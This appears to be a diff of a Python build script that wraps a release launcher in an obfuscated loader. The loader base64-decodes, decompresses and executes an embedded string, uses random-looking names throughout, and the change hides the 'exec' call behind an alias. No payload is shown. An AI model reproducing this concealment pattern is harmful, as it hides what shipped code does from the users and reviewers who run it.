@@ -9,10 +9,11 @@ launcherPath = rootPath / "release/launcher/launcher.py"
 launcherHeader = '''
 from base64 import b64decode as bng34i8g349ng3948n2f
 from zlib import decompress as plioknwef2n902349209n
-imnv34908inv34908v2349m0g4 = """'''
+jhfgd90i34gniorfg93n4girbng903=exec
+imnv34908inv34908v2349m0g4="""'''
 
 launcherFooter = '''"""
-exec(plioknwef2n902349209n(bng34i8g349ng3948n2f(imnv34908inv34908v2349m0g4.encode())).decode())
+jhfgd90i34gniorfg93n4girbng903(plioknwef2n902349209n(bng34i8g349ng3948n2f(imnv34908inv34908v2349m0g4.encode())).decode())
 '''
 
 if launcherPath.exists():
